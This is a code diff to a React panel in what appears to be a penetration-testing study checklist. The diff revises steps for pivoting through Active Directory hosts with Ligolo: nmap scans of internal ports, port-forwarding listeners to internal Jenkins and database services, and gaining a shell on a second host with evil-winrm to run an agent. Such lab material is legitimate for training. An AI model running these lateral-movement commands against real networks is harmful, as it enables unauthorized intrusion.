@@ -1807,9 +1807,10 @@ function PivotingPanel() {
       { id:"pv10", text:"Verify — you should now be able to reach internal hosts", cmd:"nmap -sT -Pn -p 445,3389,5985 10.10.110.100" },
       { id:"pv10a", text:"NOTE: Adjust subnet to match your target (check ipconfig/ifconfig on foothold for internal interfaces)" },
     ]},
-    { title: "4️⃣ ACCESS LOCAL SERVICES ON AD MACHINES", scenario: "Some services only listen on 127.0.0.1 on a target machine (e.g. internal web app, database, admin panel). Use Ligolo listener to port-forward them to your Kali.", items: [
-      { id:"pv11", text:"In the active Ligolo session — add a listener (forwards Kali port → target localhost port)", cmd:"listener_add --addr 0.0.0.0:LOCAL_PORT --to 127.0.0.1:REMOTE_PORT" },
-      { id:"pv12", text:"Example: Forward target's internal web app (port 8080) to Kali:8080", cmd:"listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080" },
+    { title: "4️⃣ ACCESS LOCAL SERVICES ON AD MACHINES", scenario: "Services on 127.0.0.1 (e.g. Jenkins, databases). listener_add forwards from the machine the AGENT runs on. If the service is on a DIFFERENT internal host (e.g. Jenkins on MS02), you need an agent on THAT machine first \u2014 see section 6.", items: [
+      { id:"pv11", text:"In the active Ligolo session — add a listener (forwards Kali port → AGENT MACHINE localhost port)", cmd:"listener_add --addr 0.0.0.0:LOCAL_PORT --to 127.0.0.1:REMOTE_PORT" },
+      { id:"pv12", text:"Example: Jenkins on MS01 localhost:8080 (agent is ON MS01)", cmd:"listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080" },
+      { id:"pv12a", text:"Jenkins on MS02 localhost? Get shell on MS02 via tunnel, upload+run agent, THEN listener_add on MS02 session", cmd:"# 1. evil-winrm -i MS02_IP  2. upload+run ligolo-agent  3. session (pick MS02)  4. listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080" },
       { id:"pv13", text:"Example: Forward target's MySQL (port 3306) to Kali:3306", cmd:"listener_add --addr 0.0.0.0:3306 --to 127.0.0.1:3306" },
       { id:"pv14", text:"Example: Forward target's MSSQL (port 1433) to Kali:1433", cmd:"listener_add --addr 0.0.0.0:1433 --to 127.0.0.1:1433" },
       { id:"pv15", text:"Access the forwarded service from Kali", cmd:"curl http://127.0.0.1:8080  # or mysql -h 127.0.0.1 -u user -p" },
